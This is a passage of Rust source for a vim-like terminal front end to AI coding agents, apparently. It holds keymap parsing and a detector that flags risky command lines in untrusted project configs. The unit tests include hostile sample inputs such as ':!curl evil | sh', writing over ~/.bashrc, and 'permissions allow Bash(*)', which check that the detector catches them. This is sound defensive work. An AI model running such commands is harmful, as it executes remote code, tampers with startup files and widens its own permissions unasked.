            LineRisk::Write => "write",
            LineRisk::Serve => "serve",
            LineRisk::Command => "command",
            LineRisk::Unknown => "unknown",
        }
    }
}

/// Leading `:`, whitespace and a range: `%`, `1,5`, `.,$`, `'<,'>`.
fn strip_range(s: &str) -> &str {
    let mut rest = s;
    loop {
        let mut cs = rest.chars();
        match cs.next() {
            Some(c) if c.is_whitespace() || ":%.$,;+-".contains(c) || c.is_ascii_digit() => rest = cs.as_str(),
            Some('\'') if cs.clone().next().is_some_and(|m| m.is_ascii_alphabetic() || m == '<' || m == '>') => {
                cs.next();
                rest = cs.as_str();
            }
            _ => return rest,
        }
    }
}

/// `word` is `full` or an abbreviation of it at least as long as `min`, like vim's command names.
fn abbrev(word: &str, min: &str, full: &str) -> bool {
    word.starts_with(min) && full.starts_with(word)
}

/// Commands that define commands or mappings, or replay keys or lines:
/// :command, :delcommand, every :map / :noremap / :unmap, :normal, :execute, :source.
fn defines(word: &str) -> bool {
    let mapping = |w: &str| w == "map" || w == "noremap" || w == "unmap" || abbrev(w, "mapc", "mapclear") || abbrev(w, "no", "noremap") || abbrev(w, "unm", "unmap");
    let after_mode = word.strip_prefix(|c: char| "nvxsoilct".contains(c));
    abbrev(word, "com", "command")
        || abbrev(word, "delc", "delcommand")
        || mapping(word)
        || after_mode.is_some_and(|w| mapping(w) || abbrev(w, "m", "map") || abbrev(w, "u", "unmap"))
        || matches!(word, "nn" | "vn" | "xn")
        || abbrev(word, "norm", "normal")
        || abbrev(word, "exe", "execute")
        || abbrev(word, "so", "source")
}

/// Commands that write a file: :w and :write (and :wq and :x, which write in vim; vigent's only
/// quit). Given a file or !, they can put the transcript over any file; a bare :w only makes a
/// new <agent>.md here, and never overwrites one.
fn writes(word: &str) -> bool {
    matches!(word, "w" | "write" | "wq" | "x")
}

/// Whether a command line, run from a project's untrusted .vigent.toml, could
/// run a program or change what runs: `:!cmd`, `:command`, `:nnoremap`,
/// `:normal`, `:trust`, `:w! file`, `:serve`, or one of your commands whose steps do.
/// `commands` gives the steps of each command a line could call by name. (src/keys.ts commandLineRisk)
pub fn command_line_risk(line: &str, commands: &dyn Fn(&str) -> Vec<Vec<String>>, depth: usize) -> Option<LineRisk> {
    let s = strip_range(line);
    if s.starts_with('!') {
        return Some(LineRisk::Shell);
    }
    let word: String = s.chars().take_while(|c| c.is_ascii_alphabetic()).collect();
    if defines(&word) {
        return Some(LineRisk::Defines);
    }
    let end = s.find(char::is_whitespace).unwrap_or(s.len());
    let (name, rest) = s.split_at(end);
    // :trust lets the file run everything; :permissions allow lets Claude Code run more
    let allow = rest.starts_with(char::is_whitespace) && rest.trim_start().strip_prefix("allow").is_some_and(|r| r.is_empty() || r.starts_with(char::is_whitespace));
    if word == "trust" || (matches!(word.as_str(), "perm" | "perms" | "permission" | "permissions") && allow) {
        return Some(LineRisk::Trust);
    }
    let after = s[word.len()..].trim();
    if writes(&word) && !after.is_empty() {
        return Some(LineRisk::Write);
    }
    // :serve opens your agents to the network (:serve local, to this machine); :serve stop closes it
    if word == "serve" && after != "stop" {
        return Some(LineRisk::Serve);
    }
    let user = name.chars().next().is_some_and(|c| c.is_ascii_uppercase()) && name.chars().all(|c| c.is_ascii_alphanumeric());
    if !user {
        return None;
    }
    for steps in commands(name) {
        for step in steps {
            if depth >= 10 {
                return Some(LineRisk::Command);
            }
            let run = crate::commands::windows::fill_args(&crate::commands::windows::normalize_step(&step), rest.trim());
            if run.starts_with('!') || command_line_risk(&run, commands, depth + 1).is_some() {
                return Some(LineRisk::Command);
            }
        }
    }
    None
}

/// Every risky command line a mapping can run, each with why (src/keys.ts mappingRisks).
pub fn mapping_risks(mode: KeyMode, rhs: &RhsValue, leader: &str, commands: &dyn Fn(&str) -> Vec<Vec<String>>) -> Vec<(String, LineRisk)> {
    mapping_command_lines(mode, rhs, leader)
        .into_iter()
        .filter_map(|l| {
            let risk = if l.sure { command_line_risk(&l.text, commands, 0) } else { Some(LineRisk::Unknown) };
            risk.map(|r| (l.text, r))
        })
        .collect()
}

/// The leader a keymap uses: the given one if it's a key, else the default (as build_keymap).
pub fn leader_or_default(leader: Option<&str>) -> String {
    match leader {
        Some(l) if parse_keys(l, DEFAULT_LEADER).is_ok() => l.to_string(),
        _ => DEFAULT_LEADER.to_string(),
    }
}

// ---------------------------------------------------------------------------
// Keymap
// ---------------------------------------------------------------------------

#[derive(Default, Clone)]
struct ModeMap {
    map: HashMap<String, Binding>,
    /// insertion order, for listings
    order: Vec<String>,
    prefixes: HashSet<String>,
}

impl ModeMap {
    fn insert(&mut self, b: Binding) {
        let k = b.keys.concat();
        if !self.map.contains_key(&k) {
            self.order.push(k.clone());
        }
        self.map.insert(k, b);
    }
    fn recompute(&mut self) {
        self.prefixes.clear();
        for b in self.map.values() {
            for i in 1..b.keys.len() {
                self.prefixes.insert(b.keys[..i].concat());
            }
        }
    }
}

pub struct Lookup {
    pub exact: Option<Binding>,
    /// a longer mapping starts with these keys
    pub prefix: bool,
}

#[derive(Clone)]
pub struct Keymap {
    pub leader: String,
    maps: HashMap<KeyMode, ModeMap>,
    defaults: HashMap<KeyMode, ModeMap>,
}

impl Default for Keymap {
    fn default() -> Self {
        Keymap::new(DEFAULT_LEADER)
    }
}

impl Keymap {
    pub fn new(leader: &str) -> Keymap {
        let mut defaults = HashMap::new();
        for mode in KEY_MODES {
            let mut m = ModeMap::default();
            for (lhs, rhs) in default_keys(mode) {
                let keys = parse_keys(&lhs, leader).expect("built-in key notation");
                let parsed = parse_rhs(&RhsValue::Str(rhs.clone()), leader).expect("built-in right-hand side");
                m.insert(Binding { keys, rhs: parsed, rhs_text: rhs, user: false });
            }
            m.recompute();
            defaults.insert(mode, m);
        }
        Keymap { leader: leader.into(), maps: defaults.clone(), defaults }
    }

    /// Add or replace a mapping (:nmap, [keys]).
    pub fn set(&mut self, mode: KeyMode, lhs: &str, rhs: &RhsValue) -> Result<Binding, String> {
        let keys = parse_keys(lhs, &self.leader)?;
        let b = Binding { keys, rhs: parse_rhs(rhs, &self.leader)?, rhs_text: rhs_text(rhs), user: true };
        let m = self.maps.get_mut(&mode).expect("every mode");
        m.insert(b.clone());
        m.recompute();
        Ok(b)
    }

    /// Remove a mapping (built-in or yours). False if nothing was mapped.
    pub fn unset(&mut self, mode: KeyMode, lhs: &str) -> bool {
        let Ok(keys) = parse_keys(lhs, &self.leader) else { return false };
        let k = keys.concat();
        let m = self.maps.get_mut(&mode).expect("every mode");
        let removed = m.map.remove(&k).is_some();
        m.order.retain(|o| *o != k);
        m.recompute();
        removed
    }

    pub fn lookup(&self, mode: KeyMode, keys: &[String], builtin_only: bool) -> Lookup {
        let m = if builtin_only { &self.defaults[&mode] } else { &self.maps[&mode] };
        let k = keys.concat();
        Lookup { exact: m.map.get(&k).cloned(), prefix: m.prefixes.contains(&k) }
    }

    /// Every active binding for a mode, in a stable order.
    pub fn bindings(&self, mode: KeyMode) -> Vec<&Binding> {
        let m = &self.maps[&mode];
        m.order.iter().filter_map(|k| m.map.get(k)).collect()
    }
}

/// A keymap from config: `leader` plus [keys.normal], [keys.insert], ... (src/keys.ts buildKeymap).
pub fn build_keymap(leader: Option<&str>, keys: &[(KeyMode, String, RhsValue)]) -> (Keymap, Vec<String>) {
    let mut warnings = vec![];
    let mut notation = DEFAULT_LEADER.to_string();
    if let Some(l) = leader {
        match parse_keys(l, DEFAULT_LEADER) {
            Ok(_) => notation = l.to_string(),
            Err(_) => warnings.push(format!("config: leader '{l}' is not a key")),
        }
    }
    let mut keymap = Keymap::new(&notation);
    for (mode, lhs, rhs) in keys {
        if let Err(e) = keymap.set(*mode, lhs, rhs) {
            warnings.push(format!("config [keys.{}] \"{lhs}\": {e}", mode.name()));
        }
    }
    (keymap, warnings)
}

// ---------------------------------------------------------------------------
// Sequencer: key presses into bindings, with vim's timeout
// ---------------------------------------------------------------------------

/// What to do after a key: run a binding (None: the keys matched nothing, so
/// they type themselves or do nothing), then feed some keys again.
#[derive(Debug, Default)]
pub struct Step {
    pub run: Vec<(Option<Binding>, Vec<String>)>,
    pub refeed: Vec<String>,
}

#[derive(Default)]
pub struct Sequencer {
    pub pending: Vec<String>,
    deadline: Option<Instant>,
}

impl Sequencer {
    pub fn feed(&mut self, keymap: &Keymap, mode: KeyMode, key: String, timeoutlen: Duration) -> Step {
        self.deadline = None;
        // Esc while waiting on a prefix: drop it, like which-key
        if key == "<Esc>" && !self.pending.is_empty() && keymap.lookup(mode, &self.pending, false).exact.is_none() {
            self.pending.clear();
            return Step::default();
        }
        self.pending.push(key);
        let r = keymap.lookup(mode, &self.pending, false);
        if r.prefix {
            self.deadline = Some(Instant::now() + timeoutlen);
            return Step::default();
        }
        let keys = std::mem::take(&mut self.pending);
        match r.exact {
            Some(b) => Step { run: vec![(Some(b), keys)], refeed: vec![] },
            None => resolve_unmatched(keymap, mode, keys),
        }
    }

    /// Called often (each frame): when the wait runs out, use the shorter mapping (or the keys themselves).
    pub fn tick(&mut self, keymap: &Keymap, mode: KeyMode) -> Step {
        match self.deadline {
            Some(d) if Instant::now() >= d => {}
            _ => return Step::default(),
        }
        self.deadline = None;
        let keys = std::mem::take(&mut self.pending);
        match keymap.lookup(mode, &keys, false).exact {
            Some(b) => Step { run: vec![(Some(b), keys)], refeed: vec![] },
            None => resolve_unmatched(keymap, mode, keys),
        }
    }

    pub fn reset(&mut self) {
        self.pending.clear();
        self.deadline = None;
    }

    /// A which-key hint is showing: wait for the next key, however long.
    pub fn hold(&mut self) {
        self.deadline = None;
    }
}

/// The keys matched nothing; the first of them may still be a shorter mapping
/// (`g` mapped, then `gx` typed): run the longest that matches and feed the rest.
fn resolve_unmatched(keymap: &Keymap, mode: KeyMode, keys: Vec<String>) -> Step {
    if keys.len() == 1 {
        return Step { run: vec![(None, keys)], refeed: vec![] };
    }
    for n in (1..keys.len()).rev() {
        if let Some(b) = keymap.lookup(mode, &keys[..n], false).exact {
            return Step { run: vec![(Some(b), keys[..n].to_vec())], refeed: keys[n..].to_vec() };
        }
    }
    Step { run: vec![(None, vec![keys[0].clone()])], refeed: keys[1..].to_vec() }
}

/// One step of replaying keys through the built-in keymap only (non-recursive,
/// like noremap), for mappings whose right-hand side is other keys: the
/// longest built-in mapping at the start of `keys` (None: the first key alone),
/// and how many keys it took. The caller reads the mode again before each step.
pub fn replay_next(keymap: &Keymap, mode: KeyMode, keys: &[String]) -> (Option<Binding>, usize) {
    for n in (1..=keys.len()).rev() {
        if let Some(b) = keymap.lookup(mode, &keys[..n], true).exact {
            return (Some(b), n);
        }
    }
    (None, 1)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn keys(s: &str) -> Vec<String> {
        parse_keys(s, DEFAULT_LEADER).unwrap()
    }

    #[test]
    fn notation_is_canonical() {
        assert_eq!(keys("gg"), ["g", "g"]);
        assert_eq!(keys("<c-D>"), ["<C-d>"]);
        assert_eq!(keys("<leader>t"), ["<Space>", "t"]);
        assert_eq!(keys("<S-tab>"), ["<S-Tab>"]);
        assert_eq!(keys("<S-x>"), ["X"]);
        assert_eq!(keys("<M-G>"), ["<M-S-g>"]);
        assert_eq!(keys("<C-w><lt>"), ["<C-w>", "<lt>"]);
        assert_eq!(keys("a<b"), ["a", "<lt>", "b"]);
        assert_eq!(keys("<Enter>"), ["<CR>"]);
        assert_eq!(parse_keys("<leader>x", ",").unwrap(), [",", "x"]);
        assert!(parse_keys("", DEFAULT_LEADER).is_err());
    }

    #[test]
    fn right_hand_sides() {
        let s = |v: &str| parse_rhs(&RhsValue::Str(v.into()), DEFAULT_LEADER);
        assert_eq!(s(":new ").unwrap(), [Rhs::Ex { cmd: "new ".into(), execute: false }]);
        assert_eq!(s(":kill<CR>").unwrap(), [Rhs::Ex { cmd: "kill".into(), execute: true }]);
        assert_eq!(s("session.goto 3").unwrap(), [Rhs::Action { name: "session.goto".into(), arg: Some("3".into()) }]);
        assert_eq!(s("gg").unwrap(), [Rhs::Keys(vec!["g".into(), "g".into()])]);
        assert!(s("session.nxt").unwrap_err().contains("did you mean 'session.next'"));
        assert_eq!(parse_rhs(&RhsValue::Bool(false), DEFAULT_LEADER).unwrap(), [Rhs::Nop]);
    }

    #[test]
    fn prefixes_wait_and_time_out() {
        let km = Keymap::default();
        let mut seq = Sequencer::default();
        let t = Duration::from_millis(0);
        assert!(seq.feed(&km, KeyMode::Normal, "g".into(), Duration::from_secs(5)).run.is_empty());
        let step = seq.feed(&km, KeyMode::Normal, "g".into(), t);
        assert!(matches!(&step.run[0].0, Some(b) if b.rhs == [Rhs::Action { name: "scroll.top".into(), arg: None }]));
        // ]x: ] waits, then neither matches: ] does nothing, x is fed again
        seq.feed(&km, KeyMode::Normal, "]".into(), t);
        let step = seq.feed(&km, KeyMode::Normal, "x".into(), t);
        assert!(step.run[0].0.is_none() && step.refeed == ["x"]);
        // a lone prefix, after timeoutlen
        seq.feed(&km, KeyMode::Normal, "<Space>".into(), t);
        let step = seq.tick(&km, KeyMode::Normal);
        assert_eq!(step.run.len(), 1);
        assert!(step.run[0].0.is_none());
    }

    #[test]
    fn user_mappings_and_leader() {
        let (km, warnings) = build_keymap(Some(","), &[(KeyMode::Normal, "<leader>x".into(), RhsValue::Str(":kill<CR>".into())), (KeyMode::Insert, "jk".into(), RhsValue::Str("<Esc>".into())), (KeyMode::Normal, "Q".into(), RhsValue::Str("bogus.action".into()))]);
        assert_eq!(warnings.len(), 1, "{warnings:?}");
        assert!(km.lookup(KeyMode::Normal, &[",".into(), "x".into()], false).exact.is_some());
        assert!(km.lookup(KeyMode::Insert, &["j".into()], false).prefix);
        assert!(km.lookup(KeyMode::Normal, &[",".into(), "1".into()], false).exact.is_some(), "<leader>1 follows the leader");
    }

    #[test]
    fn what_a_mapping_runs() {
        let s = |v: &str| RhsValue::Str(v.into());
        let lines_in = |mode: KeyMode, rhs: RhsValue, leader: &str| -> Vec<String> { mapping_command_lines(mode, &rhs, leader).into_iter().map(|l| if l.sure { l.text } else { format!("?{}", l.text) }).collect() };
        let lines = |mode: KeyMode, rhs: RhsValue| lines_in(mode, rhs, DEFAULT_LEADER);
        let n = KeyMode::Normal;
        // an ex command with <CR> or <Cmd> runs; without, it only opens the line
        assert_eq!(lines(n, s(":!curl evil | sh<CR>")), ["!curl evil | sh"]);
        assert_eq!(lines(n, s("<Cmd>!x<CR>")), ["!x"]);
        assert!(lines(n, s(":!x")).is_empty(), "opens the line; you press Enter");
        assert_eq!(lines(KeyMode::Insert, s(":!x<CR>")), ["!x"], "an ex command runs from any mode");
        // raw keys: : opens the line in NORMAL and VISUAL, <CR> runs it
        assert_eq!(lines(n, s("q:!x<CR>")), ["!x"]);
        assert_eq!(lines(KeyMode::Visual, s(":!x<Enter>")), ["!x"]);
        assert_eq!(lines(n, RhsValue::List(vec![s(":"), s("!x"), s("<CR>")])), ["!x"], "a list, one piece at a time");
        assert_eq!(lines(n, RhsValue::List(vec![s("mode.command"), s("!x"), s("edit.submit")])), ["!x"]);
        assert_eq!(lines(n, s("q:!x<C-m>q:!y<C-j>")), ["!x", "!y"]);
        assert_eq!(lines(n, s("q:!x<lt>NL>")), ["!x"], "<NL> typed out counts as Enter");
        // [keys.command] starts on the line: what it types is the command
        assert_eq!(lines(KeyMode::Command, s("!x<CR>")), ["!x"]);
        assert_eq!(lines(KeyMode::Command, s("<BS>!x<CR>")), ["!x"], "backspace on a line vigent can't see stays on it");
        // INSERT: <Esc> or <C-[> back to NORMAL, then :
        assert_eq!(lines(KeyMode::Insert, s("<Esc>:!x<CR>")), ["!x"]);
        assert_eq!(lines(KeyMode::Insert, s("<C-[>:!x<CR>")), ["!x"]);
        assert!(lines(KeyMode::Insert, s("hello:!x")).is_empty(), "typed into the prompt");
        // editing the line
        assert_eq!(lines(n, s("q:x<BS>!y<CR>")), ["!y"]);
        assert_eq!(lines(n, s("q:!x<C-u>kill<CR>")), ["kill"]);
        assert!(lines(n, s("q:<BS>!x<CR>")).is_empty(), "backspace on an empty line leaves it");
        assert!(lines(n, s("q:!x<Esc>")).is_empty(), "<Esc> leaves the line");
        assert_eq!(lines(n, s("q:kill<Home>!<CR>")), ["?kill!"], "after the cursor moves, vigent can't tell");
        assert_eq!(lines(n, s("q:<Up><CR>")), ["?"], "history: unknown");
        assert_eq!(lines_in(n, s("<leader>!x<CR>"), ":"), ["!x"], "the leader is replayed too");
        assert!(lines(n, s("gg")).is_empty());
        assert!(lines(n, RhsValue::Bool(false)).is_empty());

        // shell commands, and what defines or replays
        let commands = |name: &str| -> Vec<Vec<String>> {
            let steps: &[&str] = match name {
                "Land" => &["!npm test", "pr"],
                "Any" => &["{args}"],
                "Loop" => &["Loop"],
                "Review" => &["new -t review {args}"],
                _ => return vec![],
            };
            vec![steps.iter().map(|x| x.to_string()).collect()]
        };
        let risky = |rhs: RhsValue| -> Vec<String> { mapping_risks(n, &rhs, DEFAULT_LEADER, &commands).into_iter().map(|(l, r)| format!("{}: {l}", r.name())).collect() };
        assert_eq!(risky(s(":command X !y<CR>")), ["defines: command X !y"]);
        assert_eq!(risky(s(":com! X !y<CR>")), ["defines: com! X !y"]);
        assert_eq!(risky(s(":delcommand Land<CR>")), ["defines: delcommand Land"]);
        assert_eq!(risky(s(":nnoremap x :!y<CR>")), ["defines: nnoremap x :!y"]);
        for cmd in ["map", "nmap", "imap", "vmap", "xmap", "cmap", "noremap", "inoremap", "unmap", "nunmap", "nn", "norm", "normal", "exe", "execute", "so", "source"] {
            assert_eq!(risky(s(&format!(":{cmd} x<CR>"))), [format!("defines: {cmd} x")], "{cmd}");
        }
        assert_eq!(risky(s(":%!sort<CR>")), ["shell: %!sort"]);
        assert_eq!(risky(s(":'<,'>!sort<CR>")), ["shell: '<,'>!sort"]);
        assert_eq!(risky(s(": 1,5 !sort<CR>")), ["shell: 1,5 !sort"]);
        assert_eq!(risky(s(":trust<CR>")), ["trust: trust"]);
        assert_eq!(risky(s(":permissions allow Bash(*)<CR>")), ["trust: permissions allow Bash(*)"]);
        assert_eq!(risky(s("q:<Up><CR>")), ["unknown: "]);
        // a command whose steps run a shell command, here or through {args}
        assert_eq!(risky(s(":Land<CR>")), ["command: Land"]);
        assert_eq!(risky(s(":Any !x<CR>")), ["command: Any !x"]);
        assert_eq!(risky(s(":Any nmap j :!x<CR>")), ["command: Any nmap j :!x"]);
        assert_eq!(risky(s(":Loop<CR>")), ["command: Loop"], "too deep to tell: counted");
        // what stays allowed
        for rhs in [s(":colorscheme nord<CR>"), s(":new "), s(":kill<CR>"), s(":Review x<CR>"), s(":permissions<CR>"), s(":q!<CR>"), s("session.next"), s("gg"), RhsValue::List(vec![s("fold.open_all"), s("scroll.bottom")]), s(":set nonumber<CR>")] {
            assert!(risky(rhs.clone()).is_empty(), "{rhs:?}");
        }
        assert_eq!(command_line_risk("Land", &|_| vec![], 0), None, "a command nobody defines runs nothing");
    }

    #[test]
    fn writing_a_file_and_serve_are_risky() {
        let none = |_: &str| -> Vec<Vec<String>> { vec![] };
        let risk = |line: &str| command_line_risk(line, &none, 0);
        // :w writes the transcript over any file it names (:w! even over one that's there)
        for line in ["w ~/.bashrc", "w! ~/.bashrc", "w!", "write ~/.bashrc", "write! x.md", "write!", ":w x", " w  ../x ", "%w x", "wq x", "wq!", "x x", "x!"] {
            assert_eq!(risk(line), Some(LineRisk::Write), "{line}");
        }
        // :serve opens your agents to the network, :serve local to this machine
        for line in ["serve", "serve local", "serve 9000", "serve local 9000", ":serve", "serve stop now", "serve {args}"] {
            assert_eq!(risk(line), Some(LineRisk::Serve), "{line}");
        }
        // a bare :w only makes a new <agent>.md here and never overwrites one; :serve stop only closes it
        for line in ["w", ":w", " w ", "write", "wq", "x", "serve stop", "serve  stop ", "wincmd w", "wa", "wqa", "xa", "Write x", "server", "sp x"] {
            assert_eq!(risk(line), None, "{line}");
        }
        // mappings that run them, and commands whose steps do
        let s = |v: &str| RhsValue::Str(v.into());
        let commands = |name: &str| -> Vec<Vec<String>> {
            let steps: &[&str] = match name {
                "Save" => &["w! {args}"],
                "Share" => &["serve local"],
                "Keep" => &["w"],
                "Stop" => &["serve stop"],
                _ => return vec![],
            };
            vec![steps.iter().map(|x| x.to_string()).collect()]
        };
        let risky = |rhs: RhsValue| -> Vec<String> { mapping_risks(KeyMode::Normal, &rhs, DEFAULT_LEADER, &commands).into_iter().map(|(l, r)| format!("{}: {l}", r.name())).collect() };
        assert_eq!(risky(s(":w! ~/.bashrc<CR>")), ["write: w! ~/.bashrc"]);
        assert_eq!(risky(s("q:write x.md<CR>")), ["write: write x.md"]);
        assert_eq!(risky(s(":serve<CR>")), ["serve: serve"]);
        assert!(risky(s(":w<CR>")).is_empty());
        assert!(risky(s(":serve stop<CR>")).is_empty());
        assert_eq!(risky(s(":Save<CR>")), ["command: Save"], "w! with no file still overwrites <agent>.md");
        assert_eq!(risky(s(":Share<CR>")), ["command: Share"]);
        assert!(risky(s(":Keep<CR>")).is_empty());
        assert!(risky(s(":Stop<CR>")).is_empty());
    }

    #[test]
    fn key_events_become_tokens() {
        let k = |code, m| token_from_event(&KeyEvent::new(code, m)).unwrap();
        assert_eq!(k(KeyCode::Char('d'), KeyModifiers::CONTROL), "<C-d>");
        assert_eq!(k(KeyCode::Char('G'), KeyModifiers::SHIFT), "G");
        assert_eq!(k(KeyCode::Char(' '), KeyModifiers::NONE), "<Space>");
        assert_eq!(k(KeyCode::BackTab, KeyModifiers::SHIFT), "<S-Tab>");
        assert_eq!(k(KeyCode::Enter, KeyModifiers::NONE), "<CR>");
        assert_eq!(k(KeyCode::Char('<'), KeyModifiers::NONE), "<lt>");
        assert_eq!(k(KeyCode::Char(':'), KeyModifiers::SHIFT), ":");
    }
}
